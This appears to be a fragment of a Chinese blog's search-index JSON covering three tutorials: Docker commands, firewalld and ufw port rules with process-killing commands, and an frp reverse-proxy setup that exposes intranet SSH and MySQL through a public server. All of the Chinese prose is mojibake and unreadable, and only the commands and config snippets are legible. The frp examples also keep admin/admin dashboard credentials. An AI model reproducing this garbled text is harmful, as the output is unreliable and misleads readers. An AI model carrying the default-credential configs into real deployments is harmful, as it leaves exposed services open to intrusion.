å¯ä»¥ä¸‹è½½ä¸åŒæ ‡ç­¾çš„é•œåƒã€‚ æŸ¥çœ‹å·²ä¸‹è½½é•œåƒdocker images -a # æˆ–è€… docker image ls åˆ é™¤é•œåƒdocker rmi [Image ID] ç«¯å£ç›¸å…³ç«¯å£æ˜ å°„å°†dockerå†…çš„80ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„8000ç«¯å£ä¸Š # å¯ä»¥ä½¿ç”¨--nameè‡ªå®šä¹‰éƒ¨ç½²çš„å®¹å™¨å docker run -d -p 8000:80 --name å®¹å™¨å é•œåƒå # ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡é•œåƒéƒ¨ç½² docker run -d -p 8000:80 é•œåƒå ï¼ˆåˆ«æ€¥ï¼Œæ…¢æ…¢å­¦å¥½äº†å•¦â€¦â€¦ æ‹“å±•é˜…è¯»Dockerä»å…¥é—¨åˆ°å®è·µ GitBook https://yeasy.gitbooks.io/docker_practice/content/ Docker-é•œåƒå¸¸ç”¨å‘½ä»¤ https://blog.csdn.net/y472360651/article/details/81289088 Dockeræ¸©æ•…çŸ¥æ–° https://www.sqlsec.com/2019/10/docker2.html","path":"2020/02/02/Server_Docker/"},{"title":"Linux Firewall & Port Configuration","text":"å‰è¨€æœ€è¿‘åœ¨é…æœåŠ¡å™¨ç¯å¢ƒçš„æ—¶å€™ï¼ŒåŠ¨ä¸åŠ¨é‡åˆ°ç«¯å£æ— æ³•è®¿é—®çš„æƒ…å†µï¼ŒæŠ˜è…¾äº†è€åŠå¤©ï¼Œç»è¿‡åˆ†æåˆ¤æ–­æœ€ååŸºæœ¬æ˜¯é˜²ç«å¢™æŠŠç½‘ç»œç«¯å£ç»™æ‹¦äº†â€¦â€¦ äºæ˜¯å°±æ¥ç®€è¦è®°å½•ä¸€ä¸‹Linuxä¸‹çš„é˜²ç«å¢™é…ç½®ï¼Œä»¥åŠç«¯å£å¼€æ”¾ã€å…³é—­çš„é…ç½®æ–¹æ³•ã€‚ æ•´ç†è‡ªç½‘ç»œå•¦ã€‚ CentOSCentOSä¸‹ç”¨çš„æ˜¯firewall-cmd å¸¸ç”¨å‘½ä»¤å¯åŠ¨firewallsystemctl start firewalld.service å¼€æœºè‡ªå¯firewallsystemctl enable firewalld.service æŸ¥çœ‹å¼€æœºè‡ªå¯æ˜¯å¦è®¾ç½®æˆåŠŸsystemctl is-enabled firewalld.service; echo $? è¿”å›å¦‚ä¸‹åˆ™å¼€å¯æˆåŠŸ &gt;enabled &gt;0 é‡å¯firewallsystemctl restart firewalld.service å…³é—­firewallsystemctl stop firewalld.service æ£€æµ‹firewallçŠ¶æ€firewall-cmd --state ä¾‹å¦‚æ­£åœ¨è¿è¡Œï¼š [root@localhost ~]# firewall-cmd --state running ä¸åœ¨è¿è¡Œåˆ™ä¸ºnot running ç«¯å£é…ç½®æŸ¥çœ‹å¼€æ”¾ï¼ˆç›‘å¬ï¼‰çš„ç«¯å£firewall-cmd --list-ports exampleï¼š [root@localhost ~]# firewall-cmd --list-ports 80/tcp 7650/tcp 3306/tcp æˆ– netstat -ntlp å¦‚æœæ²¡æœ‰çš„è¯ï¼ˆcentos7é»˜è®¤æ²¡æœ‰ netstat å‘½ä»¤ï¼‰ï¼Œå…ˆå®‰è£…net-toolsã€‚ &gt;yum install -y net-tools &gt;[root@localhost ~]# netstat -ntlp &gt;Active Internet connections (only servers) &gt;Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name &gt;tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 14301/mysqld &gt;tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1840/sshd &gt;tcp6 0 0 :::6011 :::* LISTEN 8037/sshd: root@pts &gt;tcp6 0 0 :::22 :::* LISTEN 1840/sshd &gt;â€¦â€¦ å…¶ä¸­tcpä¸ºipv4ï¼Œtcp6ä¸ºipv6. é‡åˆ°è¿‡å‡ æ¬¡æ²¡æœ‰å¼€æ”¾firewallç«¯å£æ—¶ï¼Œåªæœ‰tcp6è€Œæ— tcpçš„æƒ…å†µï¼Œå¯¼è‡´è®¿é—®å¤±è´¥ã€‚æ”¾è¡Œç«¯å£åè®¿é—®æ­£å¸¸ã€‚ è¿˜é‡åˆ°è¿‡åªèƒ½ä»æœ¬åœ° 127.0.0.1 æˆ– localhostï¼ˆå®é™…ä¸ŠäºŒè€…ä¸€æ ·çš„ï¼Œé»˜è®¤å†™åœ¨äº†hosté‡Œï¼‰è®¿é—®ï¼Œé€šè¿‡ï¼ˆç½‘å¡çš„ï¼‰IPåœ°å€æ— æ³•è®¿é—®çš„æƒ…å†µã€‚è¡¨ç°åœ¨ Local Address ä¸Šæ˜¯127.0.0.1:xxxxï¼Œé€šè¿‡ä¿®æ”¹è¯¥ç¨‹åºçš„ç½‘ç»œè®¾ç½®æŠŠAddressä¿®æ”¹ä¸ºå¯¹åº”çš„IPæˆ– 0.0.0.0ï¼Œå³å¯è§£å†³è®¿é—®çš„é—®é¢˜ã€‚ ä»¥ä¸‹æ“ä½œä¹‹åéƒ½è¦æ‰§è¡Œ é‡è½½ æˆ– é‡å¯ æ‰èƒ½ç”Ÿæ•ˆï¼ï¼ï¼å¼€å¯ç‰¹å®šç«¯å£firewall-cmd --zone=public --add-port=80/tcp --permanent # å¼€æ”¾ç«¯å£ systemctl restart firewalld.service # é‡å¯firewall å…¶ä¸­ï¼Œ å‚æ•°å«ä¹‰ä¸º--zone ä½œç”¨åŸŸ--add-port=80/tcp æ·»åŠ ç«¯å£ï¼Œæ ¼å¼ä¸ºï¼šç«¯å£/é€šè®¯åè®®ï¼ˆtcpæˆ–udpï¼‰--permanent æ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆ [root@localhost ~]# firewall-cmd --zone=public --add-port=80/tcp --permanent success æˆåŠŸåˆ™è¿”å› success å¼€æ”¾å¤šä¸ªç«¯å£firewall-cmd --zone=public --add-port=8080-8083/tcp --permanent firewall-cmd --reload # é…ç½®ç«‹å³ç”Ÿæ•ˆ å…³é—­ç‰¹å®šç«¯å£firewall-cmd --zone=public --remove-port=5672/tcp --permanent #å…³é—­5672ç«¯å£ firewall-cmd --reload # é…ç½®ç«‹å³ç”Ÿæ•ˆ # ä¹Ÿå¯ä»¥ç”¨restart é’ˆå¯¹æŸä¸ª IP å¼€æ”¾ç«¯å£firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.142.166\" port protocol=\"tcp\" port=\"6379\" accept\" firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.233\" accept\" åˆ é™¤æŸä¸ª IPfirewall-cmd --permanent --remove-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.51\" accept\" é’ˆå¯¹ä¸€ä¸ª IP æ®µè®¿é—®firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.0/16\" accept\" firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.0/24\" port protocol=\"tcp\" port=\"9200\" accept\" UbuntuUbuntu ç³»ç»Ÿé»˜è®¤æä¾›äº†ä¸€ä¸ªåŸºäºiptablesä¹‹ä¸Šçš„é˜²ç«å¢™å·¥å…·ufwã€‚ å¸¸ç”¨å‘½ä»¤å®‰è£…ufwï¼ˆé»˜è®¤å·²å®‰è£…ï¼‰ sudo apt-get install ufw å¯ç”¨ufwï¼Œä¸”åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªå¯sudo ufw enable å…³é—­ufwsudo ufw disable æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€sudo ufw status æ—¥å¿—ç³»ç»Ÿæ—¥å¿—ä¿å­˜äº/var/log/ufw.logã€‚LEVELæŒ‡å®šä¸åŒçš„çº§åˆ« ï¼Œé»˜è®¤çº§åˆ«æ˜¯â€˜ä½â€™ sudo ufw logging on|off LEVEL ç«¯å£ç›¸å…³è®¾ç½®é»˜è®¤ç­–ç•¥ï¼ˆæ¯”å¦‚ â€œmostly openâ€ vs â€œmostly closedâ€ï¼‰ sudo ufw default allow # å…è®¸æ‰€æœ‰å¤–éƒ¨å¯¹æœ¬æœºçš„è®¿é—®ï¼Œä¸”æœ¬æœºè®¿é—®å¤–éƒ¨æ­£å¸¸ã€‚ sudo ufw default deny # å…³é—­æ‰€æœ‰å¤–éƒ¨å¯¹æœ¬æœºçš„è®¿é—®ï¼Œä½†æœ¬æœºè®¿é—®å¤–éƒ¨æ­£å¸¸ã€‚ æ‰“å¼€æŸä¸ªç«¯å£sudo ufw allow smtp # å…è®¸æ‰€æœ‰çš„å¤–éƒ¨IPè®¿é—®æœ¬æœºçš„25/tcp ï¼ˆsmtpï¼‰ç«¯å£ sudo ufw allow 22/tcp # å…è®¸æ‰€æœ‰çš„å¤–éƒ¨IPè®¿é—®æœ¬æœºçš„22/tcp ï¼ˆsshï¼‰ç«¯å£ sudo ufw allow 53 # å…è®¸å¤–éƒ¨è®¿é—®53ç«¯å£ï¼ˆtcp/udpï¼‰ sudo ufw allow from 192.168.1.100 # å…è®¸æ­¤IPè®¿é—®æ‰€æœ‰çš„æœ¬æœºç«¯å£ sudo ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53 sudo ufw allow in on eth0 from 192.168.0.0/16 # å…è®¸æ¥è‡ª192.168.0.0-192.168.255.255çš„æ•°æ®é€šè¿‡eth0ç½‘å¡è¿›å…¥ä¸»æœº sudo ufw allow out on eth1 to 10.0.0.0/8 # å…è®¸æŒ‡å‘10.0.0.0-10.255.255.255çš„æ•°æ®é€šè¿‡eth1ç½‘å¡ä»æœ¬æœºå‘å‡º å¯ä»¥ç”¨less /etc/servicesåˆ—å‡ºæ‰€æœ‰æœåŠ¡ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬è¯¥æœåŠ¡ä½¿ç”¨äº†å“ªä¸ªç«¯å£å’Œå“ªç§åè®® å…³é—­ç«¯å£sudo ufw deny smtp # ç¦æ­¢å¤–éƒ¨è®¿é—®smtpæœåŠ¡ sudo ufw delete allow smtp # åˆ é™¤ä¸Šé¢å»ºç«‹çš„æŸæ¡è§„åˆ™ sudo ufw delete allow 80 # ç¦æ­¢å¤–éƒ¨è®¿é—®80ç«¯å£ sudo ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25 # æ‹’ç»æ¥è‡ª10.0.0.0/8åŸŸtcpåè®®æŒ‡å‘192.168.0.1ç«¯å£25çš„æ•°æ®è¿›å…¥æœ¬æœº è·¯ç”±sudo ufw route allow in on eth1 out on eth2 # å…è®¸ç»eth1è¿›å…¥ï¼Œeth2å‘å‡ºçš„æ•°æ®ç»æœ¬æœºè·¯ç”± è¿›ç¨‹ç›¸å…³å‘½ä»¤æŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯[root@localhost ~]# ps 1 PID TTY STAT TIME COMMAND 1 ? Ss 7:25 /usr/lib/systemd/systemd --switched-root --system --deserialize 22 æ€æ­»è¿›ç¨‹kill -9 1234 1234ä¸ºå¯¹åº”çš„PID åªæœ‰ç¬¬9ç§ä¿¡å·(SIGKILL)æ‰å¯ä»¥æ— æ¡ä»¶ç»ˆæ­¢è¿›ç¨‹ï¼Œå…¶ä»–ä¿¡å·è¿›ç¨‹éƒ½æœ‰æƒåˆ©å¿½ç•¥ã€‚ ä¸‹é¢æ˜¯å¸¸ç”¨çš„ä¿¡å·ï¼šHUP 1 ç»ˆç«¯æ–­çº¿INT 2 ä¸­æ–­ï¼ˆåŒ Ctrl + Cï¼‰QUIT 3 é€€å‡ºï¼ˆåŒ Ctrl + \\ï¼‰TERM 15 ç»ˆæ­¢KILL 9 å¼ºåˆ¶ç»ˆæ­¢CONT 18 ç»§ç»­ï¼ˆä¸STOPç›¸åï¼Œ fg/bgå‘½ä»¤ï¼‰STOP 19 æš‚åœï¼ˆåŒ Ctrl + Zï¼‰ æˆ–è€… æ€æ­»æŒ‡å®šåå­—çš„è¿›ç¨‹ï¼ˆkill processes by nameï¼‰ï¼Œå¯ä»¥æ‰¹é‡ç»“æŸæŸä¸ªæœåŠ¡ç¨‹åºå¸¦æœ‰çš„å…¨éƒ¨è¿›ç¨‹ã€‚ æ€æ­»æ‰€æœ‰åŒåè¿›ç¨‹ killall nginx killall -9 bash å‘è¿›ç¨‹å‘é€æŒ‡å®šä¿¡å· killall -TERM ngixn # æˆ–è€… killall -KILL nginx å‘½ä»¤å‚æ•°ï¼š -Z åªæ€æ­»æ‹¥æœ‰scontext çš„è¿›ç¨‹ -e è¦æ±‚åŒ¹é…è¿›ç¨‹åç§° -I å¿½ç•¥å°å†™ -g æ€æ­»è¿›ç¨‹ç»„è€Œä¸æ˜¯è¿›ç¨‹ -i äº¤äº’æ¨¡å¼ï¼Œæ€æ­»è¿›ç¨‹å‰å…ˆè¯¢é—®ç”¨æˆ· -l åˆ—å‡ºæ‰€æœ‰çš„å·²çŸ¥ä¿¡å·åç§° -q ä¸è¾“å‡ºè­¦å‘Šä¿¡æ¯ -s å‘é€æŒ‡å®šçš„ä¿¡å· -v æŠ¥å‘Šä¿¡å·æ˜¯å¦æˆåŠŸå‘é€ -w ç­‰å¾…è¿›ç¨‹æ­»äº¡ --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ --version æ˜¾ç¤ºç‰ˆæœ¬æ˜¾ç¤º Referencehttps://blog.csdn.net/zll_0405/article/details/81208606 https://blog.csdn.net/bigdata_mining/article/details/80699180 etc.","path":"2020/01/29/Server_firewall/"},{"title":"åŸºäºfrpå®ç°å†…ç½‘ç©¿é€","text":"å‰è¨€ä¹‹å‰ä¸ºäº†å®ç°è¿œç¨‹ç¼–ç¨‹ï¼ŒæŠ˜è…¾äº†ä¸€é˜µå­autosshï¼Œåˆ©ç”¨åå‘ä»£ç†æŠŠå†…ç½‘æœåŠ¡å™¨çš„sshæ˜ å°„åˆ°äº†å…¬ç½‘ç«¯å£ï¼Œè¯¦è§ä¸‹é¢è¿™ç¯‡ã€‚ å°æƒ³æ³• | åŸºäºVSCodeå’Œsshå®ç°è¿œç¨‹ç¼–ç¨‹/ç‚¼ä¸¹ è¿™æ¬¡éœ€æ±‚æ‰©å¤§äº†ä¸€ç‚¹ï¼Œæ¯”å¦‚è¯´æƒ³è®¿é—®å†…ç½‘æ­å»ºçš„ç½‘ç«™ã€æ•°æ®åº“ç­‰ç­‰ï¼Œä½†è¿™äº›éƒ½ä¸èƒ½ç›´æ¥åœ¨å…¬ç½‘è¿›è¡Œè®¿é—®ï¼Œautosshå°±æœ‰ç‚¹ä¸å¤§ç»™åŠ›äº†ã€‚ ä¹‹å‰è¿˜äº†è§£è¿‡èŠ±ç”Ÿå£³ã€ngrokè¿™äº›ï¼Œä½†æ˜¯ä¸€èˆ¬éœ€è¦moneyè¦é™é€Ÿæˆ–è€…è¯´ä¸å¤§å‹å¥½ï¼Œç„¶åä¸€æƒ³å¤§å®¶éƒ½åœ¨æ¨èfrpï¼Œè¿™å›å°±æ¥æŠ˜è…¾ä¸€ä¸‹å§ï¼ï¼ˆä¸»è¦æ˜¯ä»¥åå¿˜äº†è¿˜å¯ä»¥å›æ¥çœ‹å˜»å˜» æ€»ä½“æ„Ÿå—å°±æ˜¯ï¼Œ**frpæ­å»ºèµ·æ¥æ¯”autosshæ–¹ä¾¿å¤šäº†**å‘€ï¼ ç®€ä»‹What is frp? frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports TCP and UDP, as well as HTTP and HTTPS protocols, where requests can be forwarded to internal services by domain name. frp also has a P2P connect mode. frp æ˜¯ä¸€ä¸ªå¯ç”¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†åº”ç”¨ï¼Œæ”¯æŒ tcp, udp åè®®ï¼Œä¸º http å’Œ https åº”ç”¨åè®®æä¾›äº†é¢å¤–çš„èƒ½åŠ›ï¼Œä¸”å°è¯•æ€§æ”¯æŒäº†ç‚¹å¯¹ç‚¹ç©¿é€ã€‚ FRPï¼Œfast reverse proxyã€‚ä½¿ç”¨ Go è¯­è¨€å¼€å‘ï¼Œæ”¯æŒ Windowsã€Linuxã€macOSã€ARM ç­‰å¤šå¹³å°éƒ¨ç½²ã€‚ å…¶å®ç®€å•åœ°è¯´ä¹Ÿå°±æ˜¯å€ŸåŠ©ä¸€å°æœ‰å…¬ç½‘IPçš„æœåŠ¡å™¨ä½œä¸ºä¸­è½¬ï¼ŒæŠŠå†…å¤–ç½‘ç›´æ¥çš„æµé‡è¿æ¥èµ·æ¥ã€‚ å…¶å¼€æºä»“åº“ï¼šhttps://github.com/fatedier/frp What should I prepare?å†…ç½‘ä¸»æœºï¼ˆå®¢æˆ·ç«¯ï¼‰ï¼šèƒ½ä¸Šäº’è”ç½‘ï¼ˆå¤–ç½‘ï¼‰ï¼Œæˆ–è€…è¯´èƒ½è¿ä¸Šä½ çš„å…¬ç½‘æœåŠ¡å™¨å°±è¡Œã€‚ï¼ˆä½†æ²¡æœ‰å…¬ç½‘IPï¼‰ å¯ä»¥æ˜¯ç”µè„‘ï¼ˆWindowsï¼ŒMacOSï¼ŒLinuxï¼‰/åµŒå…¥å¼è®¾å¤‡ï¼ˆå¦‚æ ‘è“æ´¾ï¼‰â€¦å¯¹çš„ï¼Œfrpè·¨å¹³å°ã€‚ å…¬ç½‘ä¸»æœºï¼ˆæœåŠ¡ç«¯ï¼‰ï¼šæœ‰å…¬ç½‘IPï¼Œæˆ–è€…ç»‘å®šäº†åŸŸåèƒ½é€šè¿‡ç«¯å£è®¿é—®ä¹Ÿè¡Œã€‚ ä»¥åŠ æƒ³è¿æ¥å†…ç½‘çš„ä½ å–œæ¬¢çš„è®¾å¤‡ã€‚ æ­å»ºè¿‡ç¨‹åˆ†ä¸ºæœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ä¸¤éƒ¨åˆ†ã€‚ ä¸‹è½½ç¨‹åºæ ¹æ®å¯¹åº”çš„æ“ä½œç³»ç»ŸåŠæ¶æ„ï¼Œä» Release é¡µé¢ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ç¨‹åºã€‚ ç›®å‰æœ€æ–°çš„ç‰ˆæœ¬æ˜¯ v0.31.1 æ¯”å¦‚Windows64ä½ä¸‹è½½ frp_0.31.1_windows_amd64.zipï¼Œ Linux64ä½ä¸€èˆ¬æ˜¯è¿™ä¸ª frp_0.31.1_linux_amd64.tar.gzã€‚ å…¶ä»–ç³»ç»Ÿ/æ¶æ„çš„å¯¹åº”ä¸‹è½½å°±å¥½äº†ã€‚ å°† frps åŠ frps.ini æ”¾åˆ°å…·æœ‰å…¬ç½‘ IP çš„æœºå™¨ä¸Šã€‚ å°† frpc åŠ frpc.ini æ”¾åˆ°å¤„äºå†…ç½‘ç¯å¢ƒçš„æœºå™¨ä¸Šã€‚ æœåŠ¡å™¨ç«¯çš„æ­å»ºå¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šå¯ä»¥ç”¨wgetä¸‹è½½ã€‚ sudo mkdir -p /etc/frp cd /etc/frp sudo wget \"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz\" sudo tar xzvf frp_0.31.1_linux_amd64.tar.gz sudo mv frp_0.31.1_linux_amd64/* /etc/frp ç„¶è€Œå›½å†…ä¸‹è½½é€Ÿåº¦æ„Ÿäººï¼Œå¤§æ¦‚8Mçš„æ–‡ä»¶å°±å‡ KB/sâ€¦ äºæ˜¯è¿˜ä¸å¦‚ç›´æ¥æ­ä¸ªæ¢¯å­åˆ°å¤–é¢ä¸‹è½½å¥½äº†å†ä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚ æœåŠ¡å™¨ç«¯serverå˜›ï¼Œå½“ç„¶ç”¨çš„æ˜¯ frps åŠ frps.iniã€‚ å®Œæ•´ç‰ˆçš„ frps_full.inié‡Œé¢æœ‰å¾ˆè¯¦ç»†çš„æ³¨é‡Šï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å‚è€ƒã€‚ æœ€ç®€å•çš„é…ç½®å°±ç›´æ¥è¿™æ ·å†™ # frps.ini [common] bind_port = 7000 ç„¶å**å¯åŠ¨frps**ï¼ˆLinuxä¸‹ï¼‰ /etc/frp/frps -c /etc/frp/frps.ini å†å»æŠŠç³»ç»Ÿçš„é˜².ç«|å¢™æ‰“å¼€ï¼Œä»¥åŠé˜¿é‡Œäº‘ç­‰å¹³å°çš„å®‰å…¨ç»„è§„åˆ™è®¾å¥½å…è®¸å…¥ç«™å‡ºç«™ã€‚ è¿™ä¸ªfirewallææ­»æˆ‘äº†emmmæŠ˜è…¾äº†è€åŠå¤©æœ€åå‘ç°æ²¡æ”¾è¡Œç«¯å£â€¦â€¦ åé¢å†å†™ä¸€ç¯‡å…³äºfirewallé…ç½®çš„ã€‚ å¥½äº†ï¼Œä¸‹é¢åˆ°å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰çš„æ­å»ºåŒç†æŠŠfrpè§£å‹çš„æ–‡ä»¶æ”¾åˆ°/etc/frpæ–‡ä»¶å¤¹ä¸‹ã€‚ å®¢æˆ·ç«¯clientï¼Œç”¨çš„æ˜¯ frpc åŠ frpc.iniã€‚ # frpc.ini [common] server_addr = x.x.x.x server_port = 7000 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 7001 [Mysql] type = tcp local_ip = 127.0.0.1 #ä¹Ÿå¯ä»¥æ˜¯å±€åŸŸç½‘ä¸­çš„å†…ç½‘IP local_port = 3306 remote_port = 7002 å…¶ä¸­commoné‡Œçš„server_addræ˜¯å…¬ç½‘ä¸»æœºçš„å…¬ç½‘IPï¼Œserver_portè®¾æˆä¸æœåŠ¡ç«¯ä¸€æ ·çš„ç«¯å£ã€‚ æ¯ä¸ªæ–¹æ¡†[.+]é‡Œçš„æ˜¯nameï¼Œä¸‹é¢éƒ½å¯¹åº”ç€ä¸€ä¸ªè§„åˆ™ï¼Œè¦æ±‚ä¸èƒ½é‡åã€‚ typeå¯ä»¥æ˜¯tcp/udp/http/https/stcp/xtcpï¼ˆå…·ä½“çœ‹å®˜æ–¹æ–‡æ¡£ï¼‰ï¼Œä¸€èˆ¬å°±tcp/httpå•¦ã€‚ local_ipå’Œlocal_portä¸ºæœ¬åœ°åœ°å€åŠç«¯å£ã€‚ remote_portä¸ºå…¬ç½‘çš„ç«¯å£ï¼Œè¿™ä¸ªå¯ä»¥åœ¨æœåŠ¡ç«¯è¿›è¡Œé™åˆ¶ï¼Œæ³¨æ„è¦åœ¨æœåŠ¡ç«¯æ”¾è¡Œè¿™äº›ç«¯å£å•Šï¼ å®¢æˆ·ç«¯å¯ä»¥åœ¨å¤šä¸ªä¸»æœºä¸Šè¿è¡Œï¼Œåªè¦nameä¸é‡åå°±è¡Œã€‚ è€Œåå¯åŠ¨å®¢æˆ·ç«¯ /etc/frp/frpc -c /etc/frp/frpc.ini Windowsä¸‹ï¼š frpc.exe -c frpc.ini start proxy successè¡¨ç¤ºå¯åŠ¨æˆåŠŸã€‚ è¿œç¨‹è®¿é—®ç°åœ¨å°±å¯ä»¥ç›´æ¥é€šè¿‡å…¬ç½‘IPçš„7001ç«¯å£è®¿é—®å†…ç½‘çš„sshï¼Œé€šè¿‡7002ç«¯å£è®¿é—®å†…ç½‘çš„Mysqlå•¦ï¼ è¿œç¨‹ç¼–ç¨‹ï¼Œè®¿é—®ç½‘é¡µï¼Œç®¡ç†æ•°æ®åº“ä»€ä¹ˆçš„éƒ½å¯ä»¥å®ç°å•¦ï¼ å¥½æ£’å‘€ï¼ è¿›é˜¶Dashboardfrpçš„æœåŠ¡å™¨ç«¯æä¾›äº†ä¸€ä¸ªåœ¨webç«¯æŸ¥çœ‹è¿è¡ŒçŠ¶æ€çš„å±•ç¤ºç•Œé¢ã€‚ é…ç½®å¦‚ä¸‹ï¼Œåœ¨commonä¸­æ·»åŠ å¦‚ä¸‹ä¿¡æ¯ï¼š # frps.ini [common] dashboard_port = 7500 # æ³¨æ„å¼€æ”¾ç«¯å£ # dashboard ç”¨æˆ·åå¯†ç ï¼Œé»˜è®¤éƒ½ä¸º admin dashboard_user = admin dashboard_pwd = admin è€Œåé‡å¯æœåŠ¡ç«¯ï¼Œå°±å¯ä»¥åœ¨http://[server_addr]:7500 è®¿é—® dashboard ç•Œé¢ï¼Œç”¨æˆ·åå¯†ç é»˜è®¤ä¸º adminã€‚ è¿˜åˆ«è¯´ï¼ŒæŒºå¥½çœ‹çš„å”‰ï¼ çœ‹äº†ä¸€ä¸‹ï¼ŒåŸºäºvueå†™çš„ã€‚ Admin UIåœ¨å®¢æˆ·ç«¯ä¹Ÿæä¾›äº†ä¸€ä¸ªç±»ä¼¼äºdashboardçš„æŸ¥çœ‹çŠ¶æ€å’Œç®¡ç†é…ç½®çš„ç•Œé¢ã€‚ # frpc.ini [common] admin_addr = 127.0.0.1 admin_port = 7400 admin_user = admin admin_pwd = admin ç„¶åæœ¬åœ°å°±å¯ä»¥é€šè¿‡ http://127.0.0.1:7400 æ¥è®¿é—®æŸ¥çœ‹çŠ¶æ€å’Œä¿®æ”¹é…ç½®äº†ã€‚ è¿™é‡Œå¦‚æœæƒ³é€šè¿‡å†…ç½‘IPï¼ˆå¦‚192.168.1.66ï¼‰æŸ¥çœ‹çš„è¯ï¼Œéœ€è¦æŠŠadmin_addrä¿®æ”¹ä¸º 0.0.0.0ï¼ˆå…è®¸æ‰€æœ‰è®¿é—®ï¼‰ï¼Œæˆ–è€…å¯¹åº”çš„æœ¬åœ°IPï¼ˆå¦‚192.168.1.66ï¼‰ã€‚ åŒæ—¶ä¹Ÿéœ€è¦åœ¨æœ¬åœ°çš„firewallæ‰“å¼€è¿™ä¸ªç«¯å£ï¼Œå¦åˆ™åœ¨å†…ç½‘çš„å…¶ä»–ä¸»æœºä¹Ÿæ— æ³•è®¿é—®ã€‚ï¼ˆæŠ˜è…¾äº†è€åŠå¤©æ‰å‘ç°emmm å½“ç„¶ï¼Œæƒ³è¦åœ¨å…¬ç½‘è®¿é—®çš„è¯ï¼ŒæŠŠ7400ç«¯å£æ˜ å°„åˆ°å¤–ç½‘å°±å¥½äº†ï¼Œä¸è¿‡å®‰å…¨èµ·è§ç®—äº†å§ã€‚ å¼€å¯åŠ å¯†ã€å‹ç¼©åœ¨å®¢æˆ·ç«¯åŠ å…¥use_encryption å’Œ use_compressionè¿™ä¸¤ä¸ªå‚æ•°ã€‚ # frpc.ini [ssh] type = tcp local_port = 22 remote_port = 6000 use_encryption = true use_compression = true å¼€æœºè‡ªå¯è¿™æ¬¡ç›´æ¥æŠŠfrpä½œä¸ºä¸€ä¸ªserviceå¥½äº†ï¼Œç”¨systemdå¥½äº†ï¼ æœåŠ¡ç«¯ï¼šæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåå« frps.serviceï¼Œå†™å…¥ # frps.service [Unit] Description=Frp Server After=syslog.target network.target Wants=network.target [Service] Type=simple ExecStart=/etc/frp/frps -c /etc/frp/frps.ini ExecStop=/usr/bin/killall frps #å¯åŠ¨å¤±è´¥1åˆ†é’Ÿåå†æ¬¡å¯åŠ¨ RestartSec=1min KillMode=control-group #é‡å¯æ§åˆ¶ï¼šæ€»æ˜¯é‡å¯ Restart=always [Install] WantedBy=multi-user.target å®¢æˆ·ç«¯ï¼šfrpc.service # frpc.service [Unit] Description=Frp Client After=syslog.target network.target Wants=network.target [Service] Type=simple ExecStart=/etc/frp/frpc -c /etc/frp/frpc.ini ExecStop=/usr/bin/killall frpc #å¯åŠ¨å¤±è´¥1åˆ†é’Ÿåå†æ¬¡å¯åŠ¨ RestartSec=1min KillMode=control-group #é‡å¯æ§åˆ¶ï¼šæ€»æ˜¯é‡å¯ Restart=always [Install] WantedBy=multi-user.target è€Œåå°†æ­¤æ–‡ä»¶æ”¾åˆ° æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„**/etc/systemd/system/ ç›®å½•**ä¸‹ã€‚ å…ˆkillall frpsï¼ˆæˆ–frpcï¼‰ï¼Œå†è°ƒç”¨ sudo systemctl enable frps.service æˆ– sudo systemctl enable frpc.service è¿™æ ·å°±æˆåŠŸé…ç½®äº†å¼€æœºè‡ªå¯ã€‚ è€Œä¸”å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤è¿›è¡Œç®¡ç†ï¼š sudo systemctl start frpc.service # å¯åŠ¨ sudo systemctl stop frpc.service # åœæ­¢ sudo systemctl restart frpc.service # é‡å¯ sudo systemctl status frpc.service # æŸ¥çœ‹çŠ¶æ€ frpsåŒç†ã€‚ Summaryfrpå¾ˆå¼ºå¤§çš„å‘¢ï¼ æ¯”å¦‚è¿˜å¯ä»¥åœ¨ä¸€å®šæƒ…å†µä¸‹ç»•è¿‡æœåŠ¡å™¨å®ç°ç‚¹å¯¹ç‚¹P2Pè¿æ¥ï¼Œä¸è¿‡å‰ææ˜¯å†…ç½‘å’Œä½ çš„è®¾å¤‡ä¸¤ç«¯éƒ½è¦è£…frpcå®¢æˆ·ç«¯ã€‚ æ›´å¤šä¸”çœ‹å®˜æ–¹æ–‡æ¡£ï¼šhttps://github.com/fatedier/frp å…³é”®è¿™ä¸ªé…ç½®èµ·æ¥è´¼æ–¹ä¾¿å•Šï¼ äºæ˜¯è¿™æ ·å°±å¯ä»¥é€šè¿‡å…¬ç½‘IPï¼Œè®¿é—®åˆ°ä½ å†…ç½‘çš„èµ„æºå•¦ï¼Œå˜»å˜»å˜»~ 